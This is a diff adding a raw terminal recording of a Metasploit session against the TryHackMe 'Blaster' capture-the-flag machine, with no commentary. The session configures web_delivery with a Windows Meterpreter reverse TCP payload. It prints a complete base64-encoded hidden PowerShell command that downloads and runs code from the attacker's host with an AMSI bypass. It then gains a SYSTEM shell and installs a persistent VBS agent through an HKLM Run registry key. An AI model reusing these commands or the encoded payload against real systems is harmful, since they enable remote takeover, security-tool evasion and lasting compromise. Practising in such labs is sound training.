@@ -1,0 +1,212 @@
+Script started on 2020-11-14 20:55:45-03:00 [TERM="xterm-256color" TTY="/dev/pts/1" COLUMNS="168" LINES="36"]
+[?2004h]0;root@Pentest: /home/joaof/e4Sec/CTFs/TryHackMe/Blaster[1;31mroot@Pentest[00m:[1;34m/home/joaof/e4Sec/CTFs/TryHackMe/Blaster[00m# msfconsole
+[?2004l[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] starting the Metasploit Framework console...|[*] STarting the Metasploit Framework console.../[*] StArting the Metasploit Framework console...-[*] StaRting the Metasploit Framework console...\[*] StarTing the Metasploit Framework console...|[*] StartIng the Metasploit Framework console.../[*] StartiNg the Metasploit Framework console...-[*] StartinG the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting The Metasploit Framework console.../[*] Starting tHe Metasploit Framework console...-[*] Starting thE Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the metasploit Framework console.../[*] Starting the MEtasploit Framework console...-[*] Starting the MeTasploit Framework console...\[*] Starting the MetAsploit Framework console...|[*] Starting the MetaSploit Framework console.../[*] Starting the MetasPloit Framework console...-[*] Starting the MetaspLoit Framework console...\[*] Starting the MetasplOit Framework console...|[*] Starting the MetasploIt Framework console.../[*] Starting the MetasploiT Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit framework console...|[*] Starting the Metasploit FRamework console.../[*] Starting the Metasploit FrAmework console...-[*] Starting the Metasploit FraMework console...\[*] Starting the Metasploit FramEwork console...|[*] Starting the Metasploit FrameWork console.../[*] Starting the Metasploit FramewOrk console...-[*] Starting the Metasploit FramewoRk console...\[*] Starting the Metasploit FrameworK console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework Console...-[*] Starting the Metasploit Framework cOnsole...\[*] Starting the Metasploit Framework coNsole...|[*] Starting the Metasploit Framework conSole.../[*] Starting the Metasploit Framework consOle...-[*] Starting the Metasploit Framework consoLe...\[*] Starting the Metasploit Framework consolE...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] starting the Metasploit Framework console...|[*] STarting the Metasploit Framework console.../[*] StArting the Metasploit Framework console...-[*] StaRting the Metasploit Framework console...\[*] StarTing the Metasploit Framework console...|[*] StartIng the Metasploit Framework console.../[*] StartiNg the Metasploit Framework console...-[*] StartinG the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting The Metasploit Framework console.../[*] Starting tHe Metasploit Framework console...-[*] Starting thE Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the metasploit Framework console.../[*] Starting the MEtasploit Framework console...-[*] Starting the MeTasploit Framework console...\[*] Starting the MetAsploit Framework console...|[*] Starting the MetaSploit Framework console.../[*] Starting the MetasPloit Framework console...-[*] Starting the MetaspLoit Framework console...\[*] Starting the MetasplOit Framework console...|[*] Starting the MetasploIt Framework console.../[*] Starting the MetasploiT Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit framework console...|[*] Starting the Metasploit FRamework console.../[*] Starting the Metasploit FrAmework console...-[*] Starting the Metasploit FraMework console...\[*] Starting the Metasploit FramEwork console...|[*] Starting the Metasploit FrameWork console.../[*] Starting the Metasploit FramewOrk console...-[*] Starting the Metasploit FramewoRk console...\[*] Starting the Metasploit FrameworK console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework Console...-[*] Starting the Metasploit Framework cOnsole...\[*] Starting the Metasploit Framework coNsole...|[*] Starting the Metasploit Framework conSole.../[*] Starting the Metasploit Framework consOle...-[*] Starting the Metasploit Framework consoLe...\[*] Starting the Metasploit Framework consolE...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] starting the Metasploit Framework console...|[*] STarting the Metasploit Framework console.../[*] StArting the Metasploit Framework console...-[*] StaRting the Metasploit Framework console...\[*] StarTing the Metasploit Framework console...|[*] StartIng the Metasploit Framework console.../[*] StartiNg the Metasploit Framework console...-[*] StartinG the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting The Metasploit Framework console.../[*] Starting tHe Metasploit Framework console...-[*] Starting thE Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the metasploit Framework console.../[*] Starting the MEtasploit Framework console...-[*] Starting the MeTasploit Framework console...\[*] Starting the MetAsploit Framework console...|[*] Starting the MetaSploit Framework console.../[*] Starting the MetasPloit Framework console...-[*] Starting the MetaspLoit Framework console...\[*] Starting the MetasplOit Framework console...|[*] Starting the MetasploIt Framework console.../[*] Starting the MetasploiT Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit framework console...|[*] Starting the Metasploit FRamework console.../[*] Starting the Metasploit FrAmework console...-[*] Starting the Metasploit FraMework console...\[*] Starting the Metasploit FramEwork console...|[*] Starting the Metasploit FrameWork console.../[*] Starting the Metasploit FramewOrk console...-[*] Starting the Metasploit FramewoRk console...\[*] Starting the Metasploit FrameworK console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework Console...-[*] Starting the Metasploit Framework cOnsole...\[*] Starting the Metasploit Framework coNsole...|[*] Starting the Metasploit Framework conSole.../[*] Starting the Metasploit Framework consOle...-[*] Starting the Metasploit Framework consoLe...\[*] Starting the Metasploit Framework consolE...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] starting the Metasploit Framework console...|[*] STarting the Metasploit Framework console.../[*] StArting the Metasploit Framework console...-[*] StaRting the Metasploit Framework console...\[*] StarTing the Metasploit Framework console...|[*] StartIng the Metasploit Framework console.../[*] StartiNg the Metasploit Framework console...-[*] StartinG the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting The Metasploit Framework console.../[*] Starting tHe Metasploit Framework console...-[*] Starting thE Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the metasploit Framework console.../[*] Starting the MEtasploit Framework console...-[*] Starting the MeTasploit Framework console...\[*] Starting the MetAsploit Framework console...|[*] Starting the MetaSploit Framework console.../[*] Starting the MetasPloit Framework console...-[*] Starting the MetaspLoit Framework console...\[*] Starting the MetasplOit Framework console...|[*] Starting the MetasploIt Framework console.../[*] Starting the MetasploiT Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit framework console...|[*] Starting the Metasploit FRamework console.../[*] Starting the Metasploit FrAmework console...-[*] Starting the Metasploit FraMework console...\[*] Starting the Metasploit FramEwork console...|[*] Starting the Metasploit FrameWork console.../[*] Starting the Metasploit FramewOrk console...-[*] Starting the Metasploit FramewoRk console...\[*] Starting the Metasploit FrameworK console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework Console...-[*] Starting the Metasploit Framework cOnsole...\[*] Starting the Metasploit Framework coNsole...|[*] Starting the Metasploit Framework conSole.../[*] Starting the Metasploit Framework consOle...-[*] Starting the Metasploit Framework consoLe...\[*] Starting the Metasploit Framework consolE...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] starting the Metasploit Framework console...|[*] STarting the Metasploit Framework console.../[*] StArting the Metasploit Framework console...-[*] StaRting the Metasploit Framework console...\[*] StarTing the Metasploit Framework console...|[*] StartIng the Metasploit Framework console.../[*] StartiNg the Metasploit Framework console...-[*] StartinG the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting The Metasploit Framework console.../[*] Starting tHe Metasploit Framework console...-[*] Starting thE Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the metasploit Framework console.../[*] Starting the MEtasploit Framework console...-[*] Starting the MeTasploit Framework console...\[*] Starting the MetAsploit Framework console...|[*] Starting the MetaSploit Framework console.../[*] Starting the MetasPloit Framework console...-[*] Starting the MetaspLoit Framework console...\[*] Starting the MetasplOit Framework console...|                                                  
+[0m[36m[0m[31m
+      .:okOOOkdc'           'cdkOOOko:.
+    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
+   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
+  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
+  oOOOOOOOO.[0m[1mMMMM[0m[31m.oOOOOoOOOOl.[0m[1mMMMM[0m[31m,OOOOOOOOo
+  dOOOOOOOO.[0m[1mMMMMMM[0m[31m.cOOOOOc.[0m[1mMMMMMM[0m[31m,OOOOOOOOx
+  lOOOOOOOO.[0m[1mMMMMMMMMM[0m[31m;d;[0m[1mMMMMMMMMM[0m[31m,OOOOOOOOl
+  .OOOOOOOO.[0m[1mMMM[0m[31m.;[0m[1mMMMMMMMMMMM[0m[31m;[0m[1mMMMM[0m[31m,OOOOOOOO.
+   cOOOOOOO.[0m[1mMMM[0m[31m.OOc.[0m[1mMMMMM[0m[31m'oOO.[0m[1mMMM[0m[31m,OOOOOOOc
+    oOOOOOO.[0m[1mMMM[0m[31m.OOOO.[0m[1mMMM[0m[31m:OOOO.[0m[1mMMM[0m[31m,OOOOOOo
+     lOOOOO.[0m[1mMMM[0m[31m.OOOO.[0m[1mMMM[0m[31m:OOOO.[0m[1mMMM[0m[31m,OOOOOl
+      ;OOOO'[0m[1mMMM[0m[31m.OOOO.[0m[1mMMM[0m[31m:OOOO.[0m[1mMMM[0m[31m;OOOO;
+       .dOOo'[0m[1mWM[0m[31m.OOOOocccxOOOO.[0m[1mMX[0m[31m'xOOd.
+         ,kOl'[0m[1mM[0m[31m.OOOOOOOOOOOOO.[0m[1mM[0m[31m'dOk,
+           :kk;.OOOOOOOOOOOOO.;Ok:
+             ;kOOOOOOOOOOOOOOOk:
+               ,xOOOOOOOOOOOx,
+                 .lOOOOOOOl.
+                    ,dOd,
+                      .[0m[0m
+
+       =[ [33mmetasploit v6.0.15-dev[0m                          ]
++ -- --=[ 2071 exploits - 1123 auxiliary - 352 post       ]
++ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 7 evasion                                       ]
+
+Metasploit tip: Enable HTTP request and response logging with [32mset HttpTrace true[0m
+
+[?1034h[4mmsf6[0m [0m> search web_delivery
+[0m
+Matching Modules
+================
+
+   #  Name                                                        Disclosure Date  Rank       Check  Description
+   -  ----                                                        ---------------  ----       -----  -----------
+   0  exploit/multi/postgres/postgres_copy_from_program_cmd_exec  2019-03-20       [32mexcellent[0m  Yes    PostgreSQL COPY FROM PROGRAM Command Execution
+   1  exploit/multi/script/[45mweb_delivery[0m                           2013-07-19       manual     No     Script Web Delivery
+
+
+Interact with a module by name or index. For example [32minfo 1[0m, [32muse 1[0m or [32muse exploit/multi/script/web_delivery[0m
+
+[4mmsf6[0m [0m> use exploit/multi/script/web_delivery
+[0m[1m[34m[*][0m Using configured payload python/meterpreter/reverse_tcp
+[4mmsf6[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> 
+[0m[4mmsf6[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> 
+[0m[4mmsf6[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> set[K[K[Kshow options
+[0m
+Module options (exploit/multi/script/web_delivery):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT  8080             yes       The local port to listen on.
+   SSL      false            no        Negotiate SSL for incoming connections
+   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                   no        The URI to use for this exploit (default is random)
+
+
+Payload options (python/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Python
+
+
+[4mmsf6[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> st[K[Kset lhost 444[K[K[K[K[K[K[K[K[K[K[K[K[Kset l[Ktarget 2
+[0mtarget => 2
+[4mmsf6[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> set lhost [K[K[K[K[K[K[K[K[K[Kifconfig tuno[K0
+[0m[1m[34m[*][0m exec: ifconfig tun0
+
+tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
+        inet 10.9.185.104  netmask 255.255.0.0  destination 10.9.185.104
+        inet6 fe80::2ad4:f931:d2ce:7c2e  prefixlen 64  scopeid 0x20<link>
+        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (Não Especificado)
+        RX packets 0  bytes 0 (0.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 7  bytes 336 (336.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+[4mmsf6[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> set lhost 10.9.185.104
+[0mlhost => 10.9.185.104
+[4mmsf6[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> set payload windows/meterpreter/reverse_tcp
+[0mpayload => windows/meterpreter/reverse_tcp
+[4mmsf6[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> show options
+[0m
+Module options (exploit/multi/script/web_delivery):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT  8080             yes       The local port to listen on.
+   SSL      false            no        Negotiate SSL for incoming connections
+   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                   no        The URI to use for this exploit (default is random)
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.9.185.104     yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   2   PSH
+
+
+[4mmsf6[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> run -j
+[0m[1m[34m[*][0m Exploit running as background job 0.
+[1m[34m[*][0m Exploit completed, but no session was created.
+
+[1m[34m[*][0m Started reverse TCP handler on 10.9.185.104:4444 
+[1m[34m[*][0m Using URL: http://0.0.0.0:8080/aa8eXEI
+[1m[34m[*][0m Local IP: http://192.168.0.17:8080/aa8eXEI
+[1m[34m[*][0m Server started.
+[1m[34m[*][0m Run the following command on the target machine:
+[4mmsf6[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABiAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwBpAGYAKABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBQAHIAbwB4AHkAXQA6ADoARwBlAHQARABlAGYAYQB1AGwAdABQAHIAbwB4AHkAKAApAC4AYQBkAGQAcgBlAHMAcwAgAC0AbgBlACAAJABuAHUAbABsACkAewAkAGIALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJABiAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AOQAuADEAOAA1AC4AMQAwADQAOgA4ADAAOAAwAC8AYQBhADgAZQBYAEUASQAvAEcAegBrAFkARABrAFkANQBnAFcAJwApACkAOwBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADkALgAxADgANQAuADEAMAA0ADoAOAAwADgAMAAvAGEAYQA4AGUAWABFAEkAJwApACkAOwA=
+[K[4mmsf6[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> pyth[K[K[K[Ksessions -l
+[0m
+Active sessions
+===============
+
+No active sessions.
+
+[4mmsf6[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> sessions
+[0m
+Active sessions
+===============
+
+No active sessions.
+
+[4mmsf6[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> sessions -l
+[0m
+Active sessions
+===============
+
+No active sessions.
+
+[4mmsf6[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> 
+[1m[34m[*][0m 10.10.241.231    web_delivery - Delivering AMSI Bypass (939 bytes)
+[1m[34m[*][0m 10.10.241.231    web_delivery - Delivering Payload (1904 bytes)
+[1m[34m[*][0m Sending stage (175174 bytes) to 10.10.241.231
+[1m[34m[*][0m Meterpreter session 1 opened (10.9.185.104:4444 -> 10.10.241.231:49842) at 2020-11-14 21:39:00 -0300
+[0m
+[0m[4mmsf6[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> [0msesson[K[K[K[K[K[Ksessions -l
+[0m
+Active sessions
+===============
+
+  Id  Name  Type                     Information                     Connection
+  --  ----  ----                     -----------                     ----------
+  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ RETROWEB  10.9.185.104:4444 -> 10.10.241.231:49842 (10.10.241.231)
+
+[4mmsf6[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> sessions i [K[K-i 1
+[0m[1m[34m[*][0m Starting interaction with 1...
+
+[4mmeterpreter[0m > [K[4mmeterpreter[0m > run persistence -X
+[0m
+[1m[33m[!][0m Meterpreter scripts are deprecated. Try exploit/windows/local/persistence.
+[1m[33m[!][0m Example: run exploit/windows/local/persistence OPTION=value [...]
+[1m[34m[*][0m Running Persistence Script
+[1m[34m[*][0m Resource file for cleanup created at /root/.msf4/logs/persistence/RETROWEB_20201114.4041/RETROWEB_20201114.4041.rc
+[1m[34m[*][0m Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.0.17 LPORT=4444
+[1m[34m[*][0m Persistent agent script is 99654 bytes long
+[1m[32m[+][0m Persistent Script written to C:\Windows\TEMP\gUOgJRsqmf.vbs
+[1m[34m[*][0m Executing script C:\Windows\TEMP\gUOgJRsqmf.vbs
+[1m[32m[+][0m Agent executed with PID 3760
+[1m[34m[*][0m Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\tqCoBWQJBIKvqu
+[1m[32m[+][0m Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\tqCoBWQJBIKvqu
+[4mmeterpreter[0m > 
+[1m[34m[*][0m 10.10.241.231 - Meterpreter session 1 closed.  Reason: Died
+
+[0m[4mmsf6[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> seso[K[K[K[Ksessions -l
+[0m
+Active sessions
+===============
+
+No active sessions.
+
+[4mmsf6[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> sessions -l[Krun 
+[0m[1m[34m[*][0m Exploit running as background job 1.
+[1m[34m[*][0m Exploit completed, but no session was created.
+
+[1m[31m[-][0m Handler failed to bind to 10.9.185.104:4444:-  -
+[1m[31m[-][0m Handler failed to bind to 0.0.0.0:4444:-  -
+[1m[31m[-][0m Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:4444).
+[4mmsf6[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> 
+[0m[4mmsf6[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> 
+[0m[4mmsf6[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> exit
+[0m
+[1m[34m[*][0m Server stopped.
+[?2004h]0;root@Pentest: /home/joaof/e4Sec/CTFs/TryHackMe/Blaster[1;31mroot@Pentest[00m:[1;34m/home/joaof/e4Sec/CTFs/TryHackMe/Blaster[00m# exit
+[?2004lexit
+
+Script done on 2020-11-14 21:43:11-03:00 [COMMAND_EXIT_CODE="0"]
